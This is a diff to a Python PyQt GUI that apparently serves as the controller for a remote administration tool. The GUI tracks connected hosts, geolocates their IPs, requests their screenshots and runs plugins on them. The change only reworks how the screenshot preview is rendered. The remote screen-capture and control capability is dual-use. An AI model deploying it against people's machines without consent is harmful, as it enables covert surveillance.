@@ -9,6 +9,7 @@ import zlib
 import threading
 import hashlib
 import Image
+import ImageQt
 import string
 import random
 from threading import Thread
@@ -32,9 +33,6 @@ geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
 # initial assets directories
 assets = os.path.join(os.getcwd(), 'assets\\')
 flags = os.path.join(assets, 'flags')
-temp_folder = os.path.join(os.getcwd(), 'tmp')
-if not os.path.exists(temp_folder):
-    os.mkdir(temp_folder)
 
 
 def get_ip_location(ip):
@@ -282,16 +280,11 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             screen_dict = get(self.socks[server]['sock'], 'getScreen', 'screenshot')
             try:
                 screen_info = ast.literal_eval(screen_dict)
-                width = screen_info['width']
-                height = screen_info['height']
-                screenbits = screen_info['screenshot']
-                path_to_preview = os.path.join(temp_folder, '__preview.png')
-                raw = zlib.decompress(screenbits)
-                size = (int(width), int(height))
-                im = Image.frombuffer('RGB', size, raw, 'raw', 'BGRX', 0, 1)
-                im.save(path_to_preview, 'PNG')
-                pixmap = QPixmap(path_to_preview).scaled(QSize(280, 175))
-                self.previewLabel.setPixmap(pixmap)
+                im = Image.frombuffer('RGB', (int(screen_info['width']), int(screen_info['height'])),
+                                      zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
+                screen_bits = im.convert('RGBA')
+                self.previewLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(screen_bits)).scaled(
+                self.previewLabel.size(), Qt.KeepAspectRatio))
             except SyntaxError:
                 pass
 
@@ -465,8 +458,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             args = {
                 'sock': self.current_sock,
                 'socket': self.socks[server]['socket'],
-                'ipAddress': self.socks[server]['ip_address'],
-                'tempPath': temp_folder
+                'ipAddress': self.socks[server]['ip_address']
             }
             plugin_id = id_generator()
             if plugin in plugins:
